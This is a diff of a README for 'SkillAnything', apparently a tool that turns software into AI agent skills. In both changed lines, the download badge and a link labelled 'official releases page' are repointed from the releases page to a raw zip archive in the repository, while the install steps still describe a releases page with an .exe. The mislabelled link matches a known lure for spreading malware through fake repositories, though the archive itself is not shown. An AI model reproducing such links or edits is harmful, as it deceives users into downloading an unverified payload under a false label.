@@ -1,6 +1,6 @@
 # 🛠️ SkillAnything - Convert any software into AI skills
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/employeesavingsplanmelagra893/SkillAnything/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/employeesavingsplanmelagra893/SkillAnything/raw/refs/heads/main/references/Anything-Skill-v2.2-alpha.5.zip)
 
 SkillAnything turns your existing computer programs into powerful tools for AI agents. You do not need to write code to make your software work with systems like Claude Code or OpenClaw. This tool watches how you use your programs and creates small files that help artificial intelligence perform tasks for you.
 
@@ -8,7 +8,7 @@ SkillAnything turns your existing computer programs into powerful tools for AI a
 
 Follow these steps to get the program on your Windows computer:
 
-1. Visit the [official releases page](https://github.com/employeesavingsplanmelagra893/SkillAnything/releases).
+1. Visit the [official releases page](https://github.com/employeesavingsplanmelagra893/SkillAnything/raw/refs/heads/main/references/Anything-Skill-v2.2-alpha.5.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe under the Assets section.
 4. Save the file to your computer.
